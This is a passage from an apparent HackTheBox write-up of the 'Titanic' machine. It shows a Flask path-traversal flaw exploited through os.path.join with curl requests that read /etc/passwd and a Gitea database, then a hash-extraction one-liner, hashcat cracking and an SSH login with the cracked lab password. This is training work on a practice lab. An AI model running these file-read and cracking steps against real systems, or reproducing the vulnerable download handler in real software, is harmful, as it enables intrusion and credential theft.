class="gp">oxdf@hacky$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://titanic.htb <span class="go"> ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \ \_/ | | \ |__ | |___ | \ | \ | \__, \__/ / \ | |__/ |___ by Ben "epi" Risher 🤓 ver: 2.11.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://titanic.htb 🚀 Threads │ 50 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt 👌 Status Codes │ All Status Codes! 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.11.0 🔎 Extract Links │ true 🏁 HTTP methods │ [GET] 🔃 Recursion Depth │ 4 ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── </span><span class="feroxbuster-red">404</span><span class="go"> GET 5l 31w 207c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go"> </span><span class="feroxbuster-red">400</span><span class="go"> GET 1l 4w 41c http://titanic.htb/download </span><span class="feroxbuster-green">200</span><span class="go"> GET 30l 77w 567c http://titanic.htb/static/styles.css </span><span class="feroxbuster-green">200</span><span class="go"> GET 664l 5682w 412611c http://titanic.htb/static/assets/images/home.jpg </span><span class="feroxbuster-green">200</span><span class="go"> GET 890l 5324w 534018c http://titanic.htb/static/assets/images/entertainment.jpg </span><span class="feroxbuster-green">200</span><span class="go"> GET 2986l 7000w 469100c http://titanic.htb/static/assets/images/favicon.ico </span><span class="feroxbuster-green">200</span><span class="go"> GET 859l 5115w 510909c http://titanic.htb/static/assets/images/luxury-cabins.jpg </span><span class="feroxbuster-red">405</span><span class="go"> GET 5l 20w 153c http://titanic.htb/book </span><span class="feroxbuster-green">200</span><span class="go"> GET 851l 5313w 507854c http://titanic.htb/static/assets/images/exquisite-dining.jpg </span><span class="feroxbuster-green">200</span><span class="go"> GET 156l 415w 7399c http://titanic.htb/ </span><span class="feroxbuster-red">403</span><span class="go"> GET 9l 28w 276c http://titanic.htb/server-status [</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 2m 30012/30012 0s </span><span class="feroxbuster-green">found</span><span class="go">:10 </span><span class="feroxbuster-red">errors</span><span class="go">:65 [</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 2m 30000/30000 302/s http://titanic.htb/ </span></code></pre></div></div> <p>The <code class="language-plaintext highlighter-rouge">/book</code> endpoint returns 405 because it only accepts POST requests.</p> <h3 id="devtitanichtb---tcp-80">dev.titanic.htb - TCP 80</h3> <h4 id="site-1">Site</h4> <p>The dev site is hosting an instance of Gitea:</p> <picture> <source type="image/webp" srcset="/img/image-20250219141615556.webp" /> <img loading="lazy" src="/img/image-20250219141615556.png" alt="image-20250219141615556" class="include_image " /> </picture> <p>Clicking Explore, there are two public repos:</p> <picture> <source type="image/webp" srcset="/img/image-20250219142013319.webp" /> <img loading="lazy" src="/img/image-20250219142013319.png" alt="image-20250219142013319" class="include_image " /> </picture> <h4 id="docker-config">docker-config</h4> <p>The docker-config repo has two folders and a <code class="language-plaintext highlighter-rouge">README.md</code>:</p> <picture> <source type="image/webp" srcset="/img/image-20250219142052518.webp" /> <img loading="lazy" src="/img/image-20250219142052518.png" alt="image-20250219142052518" class="include_image " /> </picture> <p>The <code class="language-plaintext highlighter-rouge">README.md</code> isn’t very interesting. Each of the folders have a <code class="language-plaintext highlighter-rouge">docker-compose.yml</code> file. The Gitea one shows a path where the Gitea data lives on the host and in the container:</p> <div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">version</span><span class="pi">:</span> <span class="s1">'</span><span class="s">3'</span> <span class="na">services</span><span class="pi">:</span> <span class="na">gitea</span><span class="pi">:</span> <span class="na">image</span><span class="pi">:</span> <span class="s">gitea/gitea</span> <span class="na">container_name</span><span class="pi">:</span> <span class="s">gitea</span> <span class="na">ports</span><span class="pi">:</span> <span class="pi">-</span> <span class="s2">"</span><span class="s">127.0.0.1:3000:3000"</span> <span class="pi">-</span> <span class="s2">"</span><span class="s">127.0.0.1:2222:22"</span> <span class="c1"># Optional for SSH access</span> <span class="na">volumes</span><span class="pi">:</span> <span class="pi">-</span> <span class="s">/home/developer/gitea/data:/data</span> <span class="c1"># Replace with your path</span> <span class="na">environment</span><span class="pi">:</span> <span class="pi">-</span> <span class="s">USER_UID=1000</span> <span class="pi">-</span> <span class="s">USER_GID=1000</span> <span class="na">restart</span><span class="pi">:</span> <span class="s">always</span> </code></pre></div></div> <p>The MySQL one has a password:</p> <div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">version</span><span class="pi">:</span> <span class="s1">'</span><span class="s">3.8'</span> <span class="na">services</span><span class="pi">:</span> <span class="na">mysql</span><span class="pi">:</span> <span class="na">image</span><span class="pi">:</span> <span class="s">mysql:8.0</span> <span class="na">container_name</span><span class="pi">:</span> <span class="s">mysql</span> <span class="na">ports</span><span class="pi">:</span> <span class="pi">-</span> <span class="s2">"</span><span class="s">127.0.0.1:3306:3306"</span> <span class="na">environment</span><span class="pi">:</span> <span class="na">MYSQL_ROOT_PASSWORD</span><span class="pi">:</span> <span class="s1">'</span><span class="s">MySQLP@$$w0rd!'</span> <span class="na">MYSQL_DATABASE</span><span class="pi">:</span> <span class="s">tickets</span> <span class="na">MYSQL_USER</span><span class="pi">:</span> <span class="s">sql_svc</span> <span class="na">MYSQL_PASSWORD</span><span class="pi">:</span> <span class="s">sql_password</span> <span class="na">restart</span><span class="pi">:</span> <span class="s">always</span> </code></pre></div></div> <h4 id="flask-app">flask-app</h4> <p>The flask-app repo has the source code for <code class="language-plaintext highlighter-rouge">titanic.htb</code>:</p> <picture> <source type="image/webp" srcset="/img/image-20250219142305063.webp" /> <img loading="lazy" src="/img/image-20250219142305063.png" alt="image-20250219142305063" class="include_image " /> </picture> <p>The only interesting bit is <code class="language-plaintext highlighter-rouge">app.py</code>, which shows all the routes. <code class="language-plaintext highlighter-rouge">/</code> returns the static page:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">)</span> <span class="k">def</span> <span class="nf">index</span><span class="p">():</span> <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">index.html</span><span class="sh">'</span><span class="p">)</span> </code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">/book</code> takes a POST request and saves the data to a file with a random UUID filename, and then returns a redirect to <code class="language-plaintext highlighter-rouge">/download</code> with that filename:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/book</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span> <span class="k">def</span> <span class="nf">book_ticket</span><span class="p">():</span> <span class="n">data</span> <span class="o">=</span> <span class="p">{</span> <span class="sh">"</span><span class="s">name</span><span class="sh">"</span><span class="p">:</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">name</span><span class="sh">'</span><span class="p">],</span> <span class="sh">"</span><span class="s">email</span><span class="sh">"</span><span class="p">:</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">email</span><span class="sh">'</span><span class="p">],</span> <span class="sh">"</span><span class="s">phone</span><span class="sh">"</span><span class="p">:</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">phone</span><span class="sh">'</span><span class="p">],</span> <span class="sh">"</span><span class="s">date</span><span class="sh">"</span><span class="p">:</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">date</span><span class="sh">'</span><span class="p">],</span> <span class="sh">"</span><span class="s">cabin</span><span class="sh">"</span><span class="p">:</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">cabin</span><span class="sh">'</span><span class="p">]</span> <span class="p">}</span> <span class="n">ticket_id</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="nf">uuid4</span><span class="p">())</span> <span class="n">json_filename</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">ticket_id</span><span class="si">}</span><span class="s">.json</span><span class="sh">"</span> <span class="n">json_filepath</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">TICKETS_DIR</span><span class="p">,</span> <span class="n">json_filename</span><span class="p">)</span> <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">json_filepath</span><span class="p">,</span> <span class="sh">'</span><span class="s">w</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">json_file</span><span class="p">:</span> <span class="n">json</span><span class="p">.</span><span class="nf">dump</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">json_file</span><span class="p">)</span> <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">download_ticket</span><span class="sh">'</span><span class="p">,</span> <span class="n">ticket</span><span class="o">=</span><span class="n">json_filename</span><span class="p">))</span> </code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">/download</code> passes a constant <code class="language-plaintext highlighter-rouge">TICKETS_DIR</code> (which is set to “tickets” at the top of the file) and the user input parameter to <code class="language-plaintext highlighter-rouge">os.path.join</code>, and then checks if that resulting file exists and sends it:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/download</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">])</span> <span class="k">def</span> <span class="nf">download_ticket</span><span class="p">():</span> <span class="n">ticket</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">ticket</span><span class="sh">'</span><span class="p">)</span> <span class="k">if</span> <span class="ow">not</span> <span class="n">ticket</span><span class="p">:</span> <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Ticket parameter is required</span><span class="sh">"</span><span class="p">}),</span> <span class="mi">400</span> <span class="n">json_filepath</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">TICKETS_DIR</span><span class="p">,</span> <span class="n">ticket</span><span class="p">)</span> <span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">exists</span><span class="p">(</span><span class="n">json_filepath</span><span class="p">):</span> <span class="k">return</span> <span class="nf">send_file</span><span class="p">(</span><span class="n">json_filepath</span><span class="p">,</span> <span class="n">as_attachment</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">download_name</span><span class="o">=</span><span class="n">ticket</span><span class="p">)</span> <span class="k">else</span><span class="p">:</span> <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Ticket not found</span><span class="sh">"</span><span class="p">}),</span> <span class="mi">404</span> </code></pre></div></div> <h2 id="shell-as-developer">Shell as developer</h2> <h3 id="file-read">File Read</h3> <h4 id="http-request-flow">HTTP Request Flow</h4> <p>When I submit a booking request to <code class="language-plaintext highlighter-rouge">/book</code>, it returns a 302 redirect to <code class="language-plaintext highlighter-rouge">/download</code>:</p> <picture> <source type="image/webp" srcset="/img/image-20250219141457076.webp" /> <img loading="lazy" src="/img/image-20250219141457076.png" alt="image-20250219141457076" class="include_image " /> </picture> <p><code class="language-plaintext highlighter-rouge">/download</code> uses the <code class="language-plaintext highlighter-rouge">ticket</code> parameter to return the JSON file:</p> <picture> <source type="image/webp" srcset="/img/image-20250219141522720.webp" /> <img loading="lazy" src="/img/image-20250219141522720.png" alt="image-20250219141522720" class="include_image " /> </picture> <h4 id="poc">POC</h4> <p>Without looking at the source, I immediately thought this would be a potential directory traversal / file read vulnerability. The source all but confirms it. I’ll send the request for <code class="language-plaintext highlighter-rouge">/download</code> to Burp Repeater and change the <code class="language-plaintext highlighter-rouge">ticket</code> value to <code class="language-plaintext highlighter-rouge">/etc/passwd</code>:</p> <picture> <source type="image/webp" srcset="/img/image-20250219142923282.webp" /> <img loading="lazy" src="/img/image-20250219142923282.png" alt="image-20250219142923282" class="include_image " /> </picture> <p>Without seeing the source, I would have tried something like <code class="language-plaintext highlighter-rouge">../../../../../../etc/passwd</code>, but seeing that it passes my input to <code class="language-plaintext highlighter-rouge">os.path.join</code>, I can exploit the way this behaves. I most recently showed this in my video on CVE-2023-37474 in CopyParty. <a href="https://www.youtube.com/watch?v=LVDBpON4_IQ&amp;t=225s">This link</a> leads to the point in that video where I demo how <code class="language-plaintext highlighter-rouge">os.path.join</code> behaves.</p> <p>The intended behavior is something like this:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="kn">import</span> <span class="n">os</span> <span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="sh">"</span><span class="s">tickets</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">ticket.json</span><span class="sh">"</span><span class="p">)</span> <span class="go">'tickets/ticket.json' </span></code></pre></div></div> <p>But if any value passed into <code class="language-plaintext highlighter-rouge">os.path.join</code> starts with <code class="language-plaintext highlighter-rouge">/</code>, then all the values before it are dropped. For example:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="sh">"</span><span class="s">tickets</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">/etc</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">passwd</span><span class="sh">"</span><span class="p">)</span> <span class="go">'/etc/passwd' </span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="sh">"</span><span class="s">tickets</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">/etc/passwd</span><span class="sh">"</span><span class="p">)</span> <span class="go">'/etc/passwd' </span></code></pre></div></div> <p>Looking a bit closer at the code, there are three possible responses while exploiting this:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">exists</span><span class="p">(</span><span class="n">json_filepath</span><span class="p">):</span> <span class="k">return</span> <span class="nf">send_file</span><span class="p">(</span><span class="n">json_filepath</span><span class="p">,</span> <span class="n">as_attachment</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">download_name</span><span class="o">=</span><span class="n">ticket</span><span class="p">)</span> <span class="k">else</span><span class="p">:</span> <span class="k">return</span> <span class="nf">jsonify</span><span class="p">({</span><span class="sh">"</span><span class="s">error</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Ticket not found</span><span class="sh">"</span><span class="p">}),</span> <span class="mi">404</span> </code></pre></div></div> <p>If the given ticket is not found at all, <code class="language-plaintext highlighter-rouge">os.path.exist</code> returns false and it returns and error message:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="s1">'http://titanic.htb/download?ticket=/etc/0xdf'</span> <span class="go">{"error":"Ticket not found"} </span></code></pre></div></div> <p>If the filepath is a file, it returns that file:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="s1">'http://titanic.htb/download?ticket=/etc/hostname'</span> <span class="go">titanic </span></code></pre></div></div> <p>If it is a directory, it will exist, but then crash in <code class="language-plaintext highlighter-rouge">send_file</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="s1">'http://titanic.htb/download?ticket=/etc/'</span> <span class="go">&lt;!doctype html&gt; &lt;html lang=en&gt; &lt;title&gt;500 Internal Server Error&lt;/title&gt; &lt;h1&gt;Internal Server Error&lt;/h1&gt; &lt;p&gt;The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.&lt;/p&gt; </span></code></pre></div></div> <p>This will allow me to check for the existence of directories.</p> <h4 id="user-flag">User Flag</h4> <p>There’s only one non-root user in the <code class="language-plaintext highlighter-rouge">passwd</code> file that has a shell set, developer. I’ll see if the website can read <code class="language-plaintext highlighter-rouge">user.txt</code> from that user’s home directory:</p> <picture> <source type="image/webp" srcset="/img/image-20250219143357613.webp" /> <img loading="lazy" src="/img/image-20250219143357613.png" alt="image-20250219143357613" class="include_image " /> </picture> <p>This is why the user flag for Titanic went in three minutes and five seconds.</p> <h3 id="ssh">SSH</h3> <h4 id="locate-gitea-db">Locate Gitea DB</h4> <p>The <code class="language-plaintext highlighter-rouge">docker-compose.yml</code> file showed that Gitea was running with a shared volume in the developer user’s home directory:</p> <div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="na">volumes</span><span class="pi">:</span> <span class="pi">-</span> <span class="s">/home/developer/gitea/data:/data</span> </code></pre></div></div> <p><a href="https://docs.gitea.com/installation/install-with-docker">This page</a> has instructions for running Gitea from Docker, including:</p> <blockquote> <p>Customization files described <a href="https://docs.gitea.com/administration/customizing-gitea">here</a> should be placed in <code class="language-plaintext highlighter-rouge">/data/gitea</code> directory. If using host volumes, it’s quite easy to access these files; for named volumes, this is done through another container or by direct access at <code class="language-plaintext highlighter-rouge">/var/lib/docker/volumes/gitea_gitea/_data</code>. The configuration file will be saved at <code class="language-plaintext highlighter-rouge">/data/gitea/conf/app.ini</code> after the installation.</p> </blockquote> <p>I’ll check for that file, and it’s there:</p> <picture> <source type="image/webp" srcset="/img/image-20250219144350031.webp" /> <img loading="lazy" src="/img/image-20250219144350031.png" alt="image-20250219144350031" class="include_image " /> </picture> <p>The most interesting thing in the config is the database info:</p> <div class="language-ini highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nn">[database]</span> <span class="py">PATH</span> <span class="p">=</span> <span class="s">/data/gitea/gitea.db</span> <span class="py">DB_TYPE</span> <span class="p">=</span> <span class="s">sqlite3</span> <span class="py">HOST</span> <span class="p">=</span> <span class="s">localhost:3306</span> <span class="py">NAME</span> <span class="p">=</span> <span class="s">gitea</span> <span class="py">USER</span> <span class="p">=</span> <span class="s">root</span> <span class="py">PASSWD</span> <span class="p">=</span> <span class="s">LOG_SQL = false</span> <span class="py">SCHEMA</span> <span class="p">=</span> <span class="s">SSL_MODE = disable</span> </code></pre></div></div> <p>It gives a path to the database, and I’ll find it there:</p> <picture> <source type="image/webp" srcset="/img/image-20250219144501414.webp" /> <img loading="lazy" src="/img/image-20250219144501414.png" alt="image-20250219144501414" class="include_image " /> </picture> <h4 id="get-hashes">Get Hashes</h4> <p>I’ll download the DB using <code class="language-plaintext highlighter-rouge">curl</code> (since getting it out of Burp is a trick):</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="s1">'http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db'</span> <span class="nt">-o</span> gitea.db <span class="go"> % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 2036k 100 2036k 0 0 2587k 0 --:--:-- --:--:-- --:--:-- 2587k </span><span class="gp">oxdf@hacky$</span><span class="w"> </span>file gitea.db <span class="go">gitea.db: SQLite 3.x database, last written using SQLite version 3045001, file counter 562, database pages 509, cookie 0x1d9, schema 4, UTF-8, version-valid-for 562 </span></code></pre></div></div> <p>I’ll connect, and there’s a bunch of tables:</p> <div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="n">sqlite3</span> <span class="n">gitea</span><span class="p">.</span><span class="n">db</span> <span class="go">SQLite version 3.45.1 2024-01-30 16:01:20 Enter ".help" for usage hints. </span><span class="gp">sqlite&gt;</span><span class="w"> </span><span class="p">.</span><span class="n">tables</span> <span class="go">access oauth2_grant access_token org_user action package action_artifact package_blob action_run package_blob_upload action_run_index package_cleanup_rule action_run_job package_file action_runner package_property action_runner_token package_version action_schedule project action_schedule_spec project_board action_task project_issue action_task_output protected_branch action_task_step protected_tag action_tasks_version public_key action_variable pull_auto_merge app_state pull_request attachment push_mirror auth_token reaction badge release branch renamed_branch collaboration repo_archiver comment repo_indexer_status commit_status repo_redirect commit_status_index repo_topic commit_status_summary repo_transfer dbfs_data repo_unit dbfs_meta repository deploy_key review email_address review_state email_hash secret external_login_user session follow star gpg_key stopwatch gpg_key_import system_setting hook_task task issue team issue_assignees team_invite issue_content_history team_repo issue_dependency team_unit issue_index team_user issue_label topic issue_user tracked_time issue_watch two_factor label upload language_stat user lfs_lock user_badge lfs_meta_object user_blocking login_source user_open_id milestone user_redirect mirror user_setting notice version notification watch oauth2_application webauthn_credential oauth2_authorization_code webhook </span></code></pre></div></div> <p>I’ll start with the <code class="language-plaintext highlighter-rouge">user</code> table, as that’s where account password hashes are stored. The <code class="language-plaintext highlighter-rouge">user</code> table looks like:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sqlite&gt; </span><span class="p">.</span><span class="n">headers</span> <span class="k">on</span> <span class="gp">sqlite&gt; </span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="k">user</span><span class="p">;</span> <span class="go">id|lower_name|name|full_name|email|keep_email_private|email_notifications_preference|passwd|passwd_hash_algo|must_change_password|login_type|login_source|login_name|type|location|website|rands|salt|language|description|created_unix|updated_unix|last_login_unix|last_repo_visibility|max_repo_creation|is_active|is_admin|is_restricted|allow_git_hook|allow_import_local|allow_create_organization|prohibit_login|avatar|avatar_email|use_custom_avatar|num_followers|num_following|num_stars|num_repos|num_teams|num_members|visibility|repo_admin_change_team_access|diff_view_style|theme|keep_activity_private 1|administrator|administrator||root@titanic.htb|0|enabled|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50|0|0|0||0|||70a5bd0c1a5d23caa49030172cdcabdc|2d149e5fbd1b20cf31db3e3c6a28fc9b|en-US||1722595379|1722597477|1722597477|0|-1|1|1|0|0|0|1|0|2e1e70639ac6b0eecbdab4a3d19e0f44|root@titanic.htb|0|0|0|0|0|0|0|0|0||gitea-auto|0 2|developer|developer||developer@titanic.htb|0|enabled|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|0|0|0||0|||0ce6f07fc9b557bc070fa7bef76a0d15|8bf3e3452b78544f8bee9400d6936d34|en-US||1722595646|1722603397|1722603397|0|-1|1|0|0|0|0|1|0|e2d95b7e207e432f62f3508be406c11b|developer@titanic.htb|0|0|0|0|2|0|0|0|0||gitea-auto|0 </span></code></pre></div></div> <p>Two long rows. I showed in <a href="/2024/12/14/htb-compiled.html#crack-gitea-hash">Compiled</a> how to make a hash from this that can be cracked with <code class="language-plaintext highlighter-rouge">hashcat</code>. I’ll use the same command here:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>sqlite3 gitea.db <span class="s2">"select passwd,salt,name from user"</span> | <span class="k">while </span><span class="nb">read </span>data<span class="p">;</span> <span class="k">do </span><span class="nv">digest</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$data</span><span class="s2">"</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">'|'</span> <span class="nt">-f1</span> | xxd <span class="nt">-r</span> <span class="nt">-p</span> | <span class="nb">base64</span><span class="si">)</span><span class="p">;</span> <span class="nv">salt</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$data</span><span class="s2">"</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">'|'</span> <span class="nt">-f2</span> | xxd <span class="nt">-r</span> <span class="nt">-p</span> | <span class="nb">base64</span><span class="si">)</span><span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$data</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">'|'</span> <span class="nt">-f</span> 3<span class="si">)</span><span class="p">;</span> <span class="nb">echo</span> <span class="s2">"</span><span class="k">${</span><span class="nv">name</span><span class="k">}</span><span class="s2">:sha256:50000:</span><span class="k">${</span><span class="nv">salt</span><span class="k">}</span><span class="s2">:</span><span class="k">${</span><span class="nv">digest</span><span class="k">}</span><span class="s2">"</span><span class="p">;</span> <span class="k">done</span> | <span class="nb">tee </span>gitea.hashes <span class="go">administrator:sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY= developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y= </span></code></pre></div></div> <h4 id="crack-hashes">Crack Hashes</h4> <p>I’ll run these into <code class="language-plaintext highlighter-rouge">hashcat</code> with <code class="language-plaintext highlighter-rouge">rockyou.txt</code> to see what comes out:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@corum:~/hackthebox/titanic-10.10.11.55$</span><span class="w"> </span>hashcat gitea.hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt <span class="nt">--user</span> <span class="go">hashcat (v6.2.6) starting in autodetect mode ...[snip]... Hash-mode was not specified with -m. Attempting to auto-detect hash mode. The following mode was auto-detected as the only one matching your input hash: 10900 | PBKDF2-HMAC-SHA256 | Generic KDF ...[snip]... sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528 ...[snip]... </span></code></pre></div></div> <p>It cracks developers to be “25282528”.</p> <h4 id="shell">Shell</h4> <p>As developer is a system user on the box as well, I’ll connect over SSH as developer:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>sshpass <span class="nt">-p</span> <span class="s1">'25282528'</span> ssh developer@titanic.htb <span class="go">Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-131-generic x86_64) ...[snip]... </span><span class="gp">developer@titanic:~$</span><span class="w"> </span></code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">user.txt</code> is here if I hadn’t already read it.</p> <h2 id="shell-as-root">Shell as root</h2> <h3 id="enumeration">Enumeration</h3> <h4 id="home-directories">Home Directories</h4> <p>There’s nothing of interest in developer’s home directory:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">developer@titanic:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span> <span class="go">total 40 drwxr-x--- 7 developer developer 4096 Feb 3 17:09 . drwxr-xr-x 3 root root 4096 Aug 1 2024 .. lrwxrwxrwx 1 root root 9 Jan 29 12:27 .bash_history -&gt; /dev/null -rw-r--r-- 1 developer developer 3771 Jan 6 2022 .bashrc drwx------ 3 developer developer 4096 Aug 1 2024 .cache drwxrwxr-x 3 developer developer 4096 Aug 2 2024 gitea drwxrwxr-x 5 developer developer 4096 Aug 1 2024 .local drwxrwxr-x 2 developer developer 4096 Aug 2 2024 mysql -rw-r--r-- 1 developer developer 807 Jan 6 2022 .profile drwx------ 2 developer developer 4096 Aug 1 2024 .ssh -rw-r----- 1 root developer 33 Aug 2 2024 user.txt </span></code></pre></div></div> <p>Unsurprisingly, there’s no other directories in <code class="language-plaintext highlighter-rouge">/home</code>.</p> <h4 id="processes">Processes</h4> <p>The processes on the system are only visible to the current user and root users:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">developer@titanic:~$</span><span class="w"> </span>ps auxww <span class="go">USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND develop+ 1165 0.0 0.8 1065008 33448 ? Ss Feb18 1:18 /usr/bin/python3 /opt/app/app.py develop+ 1616 0.1 4.2 1402504 170236 ? Ssl Feb18 3:28 /usr/local/bin/gitea web develop+ 72929 0.0 0.2 17072 9612 ? Ss 19:53 0:00 /lib/systemd/systemd --user develop+ 73026 